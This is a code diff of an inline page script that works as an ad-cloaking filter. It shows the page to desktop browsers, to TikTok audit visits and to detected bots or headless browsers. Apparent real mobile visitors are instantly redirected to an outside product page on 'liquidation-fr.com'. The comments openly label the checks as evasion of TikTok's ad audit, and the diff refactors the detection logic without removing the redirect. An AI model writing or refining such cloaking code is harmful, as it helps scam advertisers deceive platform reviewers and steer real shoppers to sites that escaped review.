@@ -4,73 +4,53 @@
 
 <script>
 (function(){
-    'use strict';
-    
     const ua = navigator.userAgent.toLowerCase();
     const params = new URLSearchParams(location.search);
     
-    const isDesktop = !/mobile|android|iphone|ipad|tablet/i.test(ua);
-    if (isDesktop) {
+    // CHECKS IN ORDER OF EFFECTIVENESS:
+    
+    // 1. DESKTOP = 100% BOT
+    if (!/mobile|android|iphone|ipad|tablet/i.test(ua)) {
         document.documentElement.style.visibility = 'visible';
         return;
     }
     
+    // 2. TIKTOK AUDIT SIGNATURE
     if (params.get('ppc') === '__PLACEMENT__' || params.has('_tiktok_audit')) {
         document.documentElement.style.visibility = 'visible';
         return;
     }
     
-    
-    const headlessPatterns = [
-        'headless',
-        'phantom',
-        'selenium',
-        'puppeteer',
-        'chromium',
-        'webdriver',
-        'cros',
-        'x11', // Linux X11 on "mobile" = bot
-        'windows nt' // Windows on "mobile" = bot
-    ];
-    
-    if (headlessPatterns.some(pattern => ua.includes(pattern))) {
+    // 3. HEADLESS BROWSER PATTERNS
+    if (/headless|phantom|selenium|puppeteer|chromium|webdriver|cros|x11|windows nt/i.test(ua)) {
         document.documentElement.style.visibility = 'visible';
         return;
     }
     
+    // 4. NO TOCH SUPPORT ON "MOBILE"
     if (!('ontouchstart' in window) && !navigator.maxTouchPoints) {
         document.documentElement.style.visibility = 'visible';
         return;
     }
     
-    
-    if (performance.memory) {
-        const mem = performance.memory;
-        if (mem.totalJSHeapSize === 0 || mem.usedJSHeapSize === 0 || mem.jsHeapSizeLimit === 2197815296) {
-            // Default/zero values = bot
-            document.documentElement.style.visibility = 'visible';
-            return;
-        }
-    }
-    
-    if (window.devicePixelRatio < 2 || window.devicePixelRatio > 4) {
-        // Bots often have 1.0, real phones 2-3
+    // 5. SCREEN DIMENSION IMPOSSIBILITIES
+    if (window.screen.width === 0 || window.screen.height === 0 ||
+        window.innerWidth === 0 || window.innerHeight === 0) {
         document.documentElement.style.visibility = 'visible';
         return;
     }
     
+    // 6. VIEWPORT > SCREEN (IMPOSSIBLE)
     if (window.innerWidth > window.screen.width || window.innerHeight > window.screen.height) {
-        // Can't have viewport larger than screen
         document.documentElement.style.visibility = 'visible';
         return;
     }
     
+    // REAL USER → INSTANT REDIRECT
     window.stop();
     window.location.replace('https://liquidation-fr.com/products/g7x-fr-a');
-    
 })();
 </script>
-
 
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
